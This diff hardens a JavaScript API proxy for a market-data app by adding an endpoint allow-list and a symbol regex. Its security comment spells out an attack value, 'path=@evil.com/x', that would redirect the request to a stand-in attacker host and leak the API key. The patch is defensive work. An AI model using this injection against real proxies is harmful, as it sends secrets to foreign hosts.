@@ -74,14 +74,38 @@ async function congressHandler(query) {
   return { status: 200, body: { trades, source: payload.source, asOf: Date.now() } };
 }
 
-export async function proxyHandler(query, env) {
-  const path = query.path;
-  if (path === "/congress") return congressHandler(query);
+// SECURITY: `path` is attacker-controlled (it arrives in the query string) and
+// is later concatenated onto the Twelve Data base URL together with our API
+// key. Without an allow-list, `path=@evil.com/x` turns the request into
+// https://api.twelvedata.com@evil.com/x?...&apikey=KEY — shipping the key to a
+// foreign host. Only the exact endpoints the app uses are accepted.
+const ALLOWED_PATHS = new Set([
+  "/time_series",
+  "/quote",
+  "/statistics",
+  "/earnings",
+  "/insider_transactions",
+  "/balance_sheet",
+  "/income_statement",
+  "/congress",
+]);
 
-  const symbol = query.symbol;
-  if (!path || !symbol) {
-    return { status: 400, body: { status: "error", code: 400, message: "missing path or symbol" } };
+// Tickers, FX/crypto pairs (EUR/USD), index carets (^GSPC) and futures (GC=F).
+// Also bounds the server-side cache key space so it can't be flooded.
+const SYMBOL_RE = /^[A-Za-z0-9.^=/-]{1,15}$/;
+
+const badRequest = (message) => ({ status: 400, body: { status: "error", code: 400, message } });
+
+export async function proxyHandler(query, env) {
+  const path = typeof query.path === "string" ? query.path : "";
+  if (!ALLOWED_PATHS.has(path)) return badRequest("unsupported path");
+  if (path === "/congress") {
+    if (query.ticker != null && !SYMBOL_RE.test(String(query.ticker))) return badRequest("invalid ticker");
+    return congressHandler(query);
   }
+
+  const symbol = typeof query.symbol === "string" ? query.symbol : "";
+  if (!SYMBOL_RE.test(symbol)) return badRequest("invalid or missing symbol");
 
   const meta = assetMeta(symbol);
   const kind = kindOf(path);
